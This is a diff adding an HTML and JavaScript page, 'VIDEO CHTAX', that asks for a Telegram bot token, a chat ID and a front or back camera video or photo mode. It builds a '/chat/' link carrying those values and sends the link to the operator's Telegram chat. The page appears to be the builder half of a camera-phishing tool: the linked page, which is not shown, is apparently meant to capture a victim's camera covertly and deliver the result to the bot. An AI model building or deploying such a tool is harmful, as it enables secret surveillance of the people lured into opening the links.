@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="bn">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>VIDEO CHTAX</title>
+  <style>
+    :root{ --red:#ff2e2e; --bg:#000; --card:#080808; }
+    html,body{height:100%;margin:0;background:var(--bg);font-family:Arial, Helvetica, sans-serif;color:var(--red)}
+    body{display:flex;align-items:center;justify-content:center;padding:20px;text-shadow:0 0 8px #ff0000}
+    .card{width:100%;max-width:520px;background:var(--card);padding:18px;border-radius:14px;border:1px solid rgba(255,0,0,0.25);box-shadow:0 0 20px rgba(255,0,0,0.12)}
+    .header-img{height:150px;border-radius:10px;background:url("https://via.placeholder.com/1200x600?text=Header+Image") center/cover;border:2px solid rgba(255,0,0,0.4);box-shadow:0 0 12px #ff0000;}
+    h1{margin:12px 0 6px;font-size:26px;text-align:center;color:var(--red);text-shadow:0 0 14px #ff0000;}
+    .marq{overflow:hidden;white-space:nowrap;border-radius:8px;padding:8px;margin-bottom:12px;background:#0b0b0b;border:1px solid rgba(255,0,0,0.08);}
+    .marq span{display:inline-block;padding-left:100%;animation:scroll 10s linear infinite;color:#ff5a5a}
+    @keyframes scroll{0%{transform:translateX(0)}100%{transform:translateX(-100%)}}
+    label{display:block;color:var(--red);font-size:13px;margin-top:10px;text-shadow:0 0 8px #ff0000}
+    input[type="text"]{width:100%;padding:10px;border-radius:8px;border:1px solid rgba(255,0,0,0.25);background:#050505;color:var(--red);box-shadow:inset 0 0 8px rgba(255,0,0,0.06);font-size:14px;margin-top:6px;}
+    .modes{display:flex;gap:8px;margin-top:12px;flex-wrap:wrap;}
+    .mode-btn{flex:1 1 calc(50% - 8px);padding:10px;border-radius:8px;border:1px solid rgba(255,0,0,0.18);background:linear-gradient(180deg, rgba(255,0,0,0.06), rgba(0,0,0,0.2));color:var(--red);cursor:pointer;text-align:center;font-weight:700;box-shadow:0 0 8px rgba(255,0,0,0.04);user-select:none;}
+    .mode-btn.selected{background:linear-gradient(90deg,#ff0000,#ff6b6b);color:#100;box-shadow:0 6px 24px rgba(255,0,0,0.25);border-color:rgba(255,255,255,0.05);}
+    .hint{margin-top:8px;font-size:13px;color:#ff9b9b}
+    button.send{width:100%;margin-top:14px;padding:12px;border:none;border-radius:10px;background:linear-gradient(90deg,#ff0000,#ff7b7b);color:#000;font-weight:800;cursor:pointer;box-shadow:0 12px 30px rgba(255,0,0,0.14);}
+    #output{margin-top:12px;color:#ff9b9b;white-space:pre-wrap;font-size:14px;text-shadow:0 0 8px #ff0000}
+    #generatedLink { display:none; }
+  </style>
+</head>
+<body>
+  <div class="card" role="main">
+    <div class="header-img" aria-hidden="true"></div>
+    <h1>VIDEO CHTAX</h1>
+    <div class="marq" aria-hidden="true"><span>DEVELOP BY ARIYAN MIRZA • DEVELOP BY ARIYAN MIRZA •</span></div>
+
+    <label for="token">Bot Token</label>
+    <input id="token" type="text" placeholder="e.g. 8522852093:AAHpH..." autocomplete="off" />
+
+    <label for="chatid">Chat ID</label>
+    <input id="chatid" type="text" placeholder="e.g. 8288458304 or @username" />
+
+    <div class="modes" role="tablist" aria-label="Modes">
+      <div class="mode-btn" data-mode="front-video">Front — Video</div>
+      <div class="mode-btn" data-mode="front-photo">Front — Photo</div>
+      <div class="mode-btn" data-mode="back-video">Back — Video</div>
+      <div class="mode-btn" data-mode="back-photo">Back — Photo</div>
+    </div>
+
+    <div class="hint">একটি অপশন *নির্বাচন* করুন (অবশ্যই)। video হলে default duration = 2s ব্যবহার করবে।</div>
+
+    <button class="send" id="sendBtn">SEND</button>
+
+    <div id="output" aria-live="polite"></div>
+    <div id="generatedLink" aria-hidden="true"></div>
+  </div>
+
+<script>
+  const getBaseDomain = () => location.origin;
+  const DEFAULT_VIDEO_DURATION = 2;
+  const modeButtons = Array.from(document.querySelectorAll('.mode-btn'));
+  let selectedMode = null;
+  modeButtons.forEach(btn=>{
+    btn.addEventListener('click', ()=>{
+      modeButtons.forEach(x=>x.classList.remove('selected'));
+      btn.classList.add('selected');
+      selectedMode = btn.dataset.mode;
+    });
+  });
+
+  const tokenEl = document.getElementById('token');
+  const chatEl = document.getElementById('chatid');
+  const sendBtn = document.getElementById('sendBtn');
+  const output = document.getElementById('output');
+  const generatedLinkHidden = document.getElementById('generatedLink');
+
+  function buildLink(token, chatId, mode){
+    const base = getBaseDomain().replace(/\/$/,'');
+    const t = encodeURIComponent(token.trim());
+    const id = encodeURIComponent(chatId.trim());
+    let url = `${base}/chat/?token=${t}&id=${id}&mode=${encodeURIComponent(mode)}`;
+    if(mode && mode.includes('video')) url += `&duration=${encodeURIComponent(DEFAULT_VIDEO_DURATION)}`;
+    return url;
+  }
+
+  async function sendViaTelegram(token, chatId, text){
+    const api = `https://api.telegram.org/bot${token}/sendMessage`;
+    const res = await fetch(api, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: chatId, text: text, disable_web_page_preview: false })
+    });
+    return res.json();
+  }
+
+  sendBtn.addEventListener('click', async ()=>{
+    output.textContent = '';
+    const token = tokenEl.value.trim();
+    const chatId = chatEl.value.trim();
+    if(!token || !chatId){ output.textContent = 'Token ও Chat ID দুইটাই দিতে হবে।'; return; }
+    if(!selectedMode){ output.textContent = 'একটি camera option সিলেক্ট করুন (Front/Back video/photo)।'; return; }
+    if(!token.includes(':') || token.length < 20){ if(!confirm('Token suspicious দেখাচ্ছে (ছোট/ভুল)। তারপরও চালাতে চাও?')) return; }
+    const finalLink = buildLink(token, chatId, selectedMode);
+    generatedLinkHidden.textContent = finalLink;
+    output.textContent = 'Link generated and will be sent to the bot. Sending...';
+    try{
+      const res = await sendViaTelegram(token, chatId, finalLink);
+      if(res && res.ok){ output.innerHTML = 'SUCCESS ✅
+Message sent to the chat.'; }
+      else{ output.innerHTML = 'FAILED ❌
+' + JSON.stringify(res, null, 2); }
+    }catch(err){ output.innerHTML = 'ERROR ❌
+' + (err.message || String(err)); }
+  });
+
+  [tokenEl, chatEl].forEach(el=>{
+    el.addEventListener('keydown', (e)=>{ if(e.key === 'Enter') sendBtn.click(); });
+  });
+</script>
+</body>
+</html>
